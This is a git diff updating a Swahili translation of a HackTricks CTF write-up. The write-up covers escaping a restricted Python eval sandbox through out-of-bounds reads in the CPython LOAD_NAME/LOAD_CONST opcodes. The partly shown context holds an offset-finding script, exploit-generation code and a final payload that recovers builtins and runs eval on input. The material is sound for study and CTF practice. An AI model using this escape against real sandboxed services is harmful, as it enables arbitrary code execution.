@@ -1,45 +1,46 @@
-# Kusoma LOAD_NAME / LOAD_CONST opcode OOB
+# Kusoma\_JINA / Kusoma\_CONST opcode OOB Soma
+
+{% hint style="success" %}
+Jifunze & zoezi AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Taarifa hii imetolewa** [**kutoka kwenye andiko hili**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**Maelezo haya yalichukuliwa** [**kutoka kwenye andiko hili**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Tunaweza kutumia kipengele cha OOB read katika opcode ya LOAD_NAME / LOAD_CONST ili kupata alama fulani kwenye kumbukumbu. Hii inamaanisha kutumia hila kama `(a, b, c, ... mamia ya alama ..., __getattribute__) if [] else [].__getattribute__(...)` ili kupata alama (kama jina la kazi) unayotaka.
+Tunaweza kutumia kipengele cha OOB soma katika opcode ya Kusoma\_JINA / Kusoma\_CONST ili kupata alama fulani kwenye kumbukumbu. Hii inamaanisha kutumia hila kama `(a, b, c, ... mamia ya alama ..., __getattribute__) if [] else [].__getattribute__(...)` ili kupata alama (kama vile jina la kazi) unayotaka.
 
-Kisha tuandae shambulio letu.
+Kisha tengeneza shambulio lako. 
 
-### Muhtasari <a href="#overview-1" id="overview-1"></a>
+### Maelezo Mafupi <a href="#overview-1" id="overview-1"></a>
 
-Msimbo wa chanzo ni mfupi sana, una mstari wa 4 tu!
+Msimbo wa chanzo ni mfupi sana, una jumla ya mistari 4!
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-Unaweza kuingiza nambari yoyote ya Python, na itaandaliwa kuwa [kitu cha nambari ya Python](https://docs.python.org/3/c-api/code.html). Hata hivyo, `co_consts` na `co_names` ya kitu hicho cha nambari zitabadilishwa na kufanywa kuwa tupu kabla ya kutekeleza kitu hicho cha nambari.
+Unaweza kuingiza kanuni ya Python ya kupita, na itakusanywa kuwa [kitu cha kanuni ya Python](https://docs.python.org/3/c-api/code.html). Walakini `co_consts` na `co_names` ya kitu hicho cha kanuni itabadilishwa na tuple tupu kabla ya kutekeleza kitu hicho cha kanuni.
 
-Kwa njia hii, matokeo yote yanayohusisha vitu (kama vile nambari, herufi n.k.) au majina (kama vile mabadiliko, kazi) yanaweza kusababisha kosa la kugawanyika mwishoni.
+Kwa njia hii, mizunguko yote inayojumuisha consts (k.m. nambari, herufi n.k.) au majina (k.m. vitu, kazi) inaweza kusababisha kosa la segemantasi mwishowe.
 
-### Kusoma Nje ya Kikomo <a href="#kusoma-nje-ya-kikomo" id="kusoma-nje-ya-kikomo"></a>
+### Kusoma Nje ya Kikomo <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-Kosa la kugawanyika linatokea vipi?
+Jinsi gani kosa la segemantasi linatokea?
 
-Tuanze na mfano rahisi, `[a, b, c]` inaweza kuandaliwa kuwa nambari ya chini ifuatayo.
+Tuanze na mfano rahisi, `[a, b, c]` inaweza kukusanywa kuwa bytecode ifuatayo.
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -47,11 +48,11 @@ Tuanze na mfano rahisi, `[a, b, c]` inaweza kuandaliwa kuwa nambari ya chini ifu
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Lakini ikiwa `co_names` inakuwa tuple tupu? OPCODE ya `LOAD_NAME 2` bado inatekelezwa, na jaribu kusoma thamani kutoka kwa anwani ya kumbukumbu ambayo awali ilikuwa. Ndiyo, hii ni "vipengele" vya kusoma nje ya mipaka.
+Lakini ikiwa `co_names` itakuwa tuple tupu? OPCODE ya `LOAD_NAME 2` bado inatekelezwa, na jaribu kusoma thamani kutoka kwa anwani ya kumbukumbu ambayo kimsingi inapaswa kuwa. Ndiyo, hii ni kusoma nje ya mipaka "sifa".
 
-Wazo kuu la suluhisho ni rahisi. Baadhi ya OPCODES katika CPython kama vile `LOAD_NAME` na `LOAD_CONST` ni hatari (?) kwa kusoma nje ya mipaka.
+Mfumo msingi wa suluhisho ni rahisi. Baadhi ya opcodes katika CPython kwa mfano `LOAD_NAME` na `LOAD_CONST` wako katika hatari (?) ya kusoma nje ya mipaka.
 
-Hizi hupata kitu kutoka kwa index `oparg` kutoka kwa tuple za `consts` au `names` (ndio maana `co_consts` na `co_names` zinaitwa chini ya pazia). Tunaweza kutaja snippest fupi ifuatayo kuhusu `LOAD_CONST` kuona CPython inafanya nini wakati inapoprosesia OPCODE ya `LOAD_CONST`.
+Hupata kitu kutoka kwa index `oparg` kutoka kwa tuple za `consts` au `names` (hizo ndizo zinaitwa `co_consts` na `co_names` chini ya pazia). Tunaweza kurejelea snippest fupi ifuatayo kuhusu `LOAD_CONST` kuona CPython inafanya nini wakati inaprocess hadi OPCODE ya `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -61,19 +62,19 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Kwa njia hii tunaweza kutumia kipengele cha OOB kupata "jina" kutoka kumbukumbu isiyojulikana. Ili kuhakikisha jina lina nini na ni kumbukumbu gani, jaribu tu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu kwenye oparg > 700. Unaweza pia jaribu kutumia gdb kuangalia muundo wa kumbukumbu, lakini sidhani itakuwa rahisi zaidi?
+Kwa njia hii tunaweza kutumia kipengele cha OOB kupata "jina" kutoka kwa mbadala wa kumbukumbu. Ili kuhakikisha jina lina nini na ni mbadala gani, jaribu tu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu karibu na oparg > 700. Unaweza pia kujaribu kutumia gdb kuangalia muundo wa kumbukumbu bila shaka, lakini siamini itakuwa rahisi zaidi?
 
 ### Kuzalisha Shambulizi <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Marafiki tunapopata vipengele muhimu kwa majina / consts, _je_ tunapata jina / const kutoka kwa kumbukumbu hiyo na kuitumia? Hapa kuna hila kwako:\
-Tufikirie tunaweza kupata jina la `__getattribute__` kutoka kumbukumbu ya 5 (`LOAD_NAME 5`) na `co_names=()`, basi fanya mambo yafuatayo:
+Marafiki tunapopata vipande muhimu kwa majina / mbadala, vipi _tunavyoweza_ kupata jina / mbadala kutoka kwa mbadala huo na kulitumia? Hapa kuna hila kwako:\
+Hebu tufikirie tunaweza kupata jina la `__getattribute__` kutoka kwa mbadala 5 (`LOAD_NAME 5`) na `co_names=()`, basi fanya mambo yafuatayo:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Tafadhali kumbuka kwamba siyo lazima kuita hii kama `__getattribute__`, unaweza kuita kwa jina fupi au la kushangaza zaidi.
+> Tafadhali fahamu kwamba si lazima kuiita kama `__getattribute__`, unaweza kuipa jina fupi au la kipekee zaidi
 
 Unaweza kuelewa sababu nyuma yake kwa kuangalia bytecode yake:
 ```python
@@ -92,20 +93,20 @@ Unaweza kuelewa sababu nyuma yake kwa kuangalia bytecode yake:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Tambua kuwa `LOAD_ATTR` pia inapata jina kutoka `co_names`. Python inapakia majina kutoka kwa offset sawa ikiwa jina ni sawa, kwa hivyo `__getattribute__` ya pili bado inapakia kutoka offset=5. Kwa kutumia kipengele hiki, tunaweza kutumia jina lolote tunapotumia jina hilo karibu na kumbukumbu.
+Tambua kwamba `LOAD_ATTR` pia hurejesha jina kutoka `co_names`. Python huload majina kutoka kwa offset ile ile ikiwa jina ni sawa, hivyo `__getattribute__` ya pili bado inapakiwa kutoka offset=5. Kwa kutumia kipengele hiki tunaweza kutumia jina lolote mara tu jina linapo karibu na kumbukumbu.
 
-Kwa kuzalisha nambari, inapaswa kuwa rahisi:
+Kwa kuzalisha nambari inapaswa kuwa rahisi:
 
 * 0: sio \[\[]]
 * 1: sio \[]
 * 2: (sio \[]) + (sio \[])
 * ...
 
-### Skripti ya Udukuzi <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Skripti ya Kutumia <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Sikutumia consts kwa sababu ya kikomo cha urefu.
+Sikutumia consts kutokana na kikomo cha urefu.
 
-Kwanza hapa kuna skripti ili tuweze kupata hizo offset za majina.
+Kwanza hapa kuna skripti ili tuweze kupata hizo offsets za majina.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -140,7 +141,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-Na yafuatayo ni kwa ajili ya kuzalisha shambulio halisi la Python.
+Na yafuatayo ni kwa ajili ya kuzalisha shambulizi la Python halisi.
 ```python
 import sys
 import unicodedata
@@ -230,16 +231,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+Jifunze na zoea AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks kwa Wataalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks kwa Wataalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>unga mkono HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
